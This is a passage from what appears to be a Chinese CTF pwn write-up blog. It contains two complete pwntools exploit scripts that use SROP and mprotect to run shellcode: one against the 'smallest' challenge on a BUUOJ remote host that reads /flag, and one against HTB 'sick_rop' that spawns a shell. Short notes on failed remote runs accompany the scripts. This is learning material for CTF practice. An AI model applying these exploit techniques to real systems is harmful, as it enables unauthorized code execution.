class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./smallest&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26278</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">10</span><br>wsnd.rdi = (stack_addr&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span><br>wsnd.rsi = <span class="hljs-number">0x1000</span><br>wsnd.rdx = <span class="hljs-number">7</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>se(p64(stack_addr+<span class="hljs-number">0x200</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>变量名是不是很帅，没啥用，就本地打通， 💨 远程一个都打不通，run 了 run 了。</p><hr><p><em><strong>2022/5/4 0:18 补充</strong></em>：<strong>SROP 在没地方落脚（指写 rsp 或者 rip 的时候），一定记得 vmmap 之后 <code>x/100xg</code> 查看一下代码段有无 text 段指针可以当跳板。</strong></p><h3 id="HTB-sick-rop（扬-text-段）"><a class="header-anchor" href="#HTB-sick-rop（扬-text-段）">¶</a>HTB - sick_rop（扬 text 段）</h3><p>由于网络原因远程没打通，罢 🐦 。主要是利用代码段残留的指针，这里可以写俩次 SROP 执行 <code>/bin/sh\0</code> getshell。</p><p>但是写 <code>mprotect</code> 其实真的只用写一次然后改 rip 就行了。因为没有其他的地址可以落脚，直接把<strong>整个代码段扬成 <code>rwx</code> 就好了</strong>QwQ。非常滴狂野快乐 crazy 不讲道理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;157.245.40.78&#x27;,32071)</span><br>vul = <span class="hljs-number">0x40102E</span><br>syscall_ret = <span class="hljs-number">0x40102B</span> <br><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">10</span><br>fuck.rdi = <span class="hljs-number">0x401000</span><br>fuck.rsi = <span class="hljs-number">0x2000</span><br>fuck.rdx = <span class="hljs-number">7</span><br>fuck.rsp = <span class="hljs-number">0x4010d8</span><br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>,<span class="hljs-number">0xdeadbeef</span>,vul,syscall_ret,fuck]<br>)<br>sl(payload)<br>pause()<br>se(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">15</span>)<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;wsnd\0&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\0&#x27;</span>),vul,<span class="hljs-number">0x4010f0</span>,asm(shellcraft.sh())] <br>)<br>pause()<br>se(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h1>Ret2dlresolve</h1><p>学不会，成消愁了，以后补上吧（但愿）。run 了 run 了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
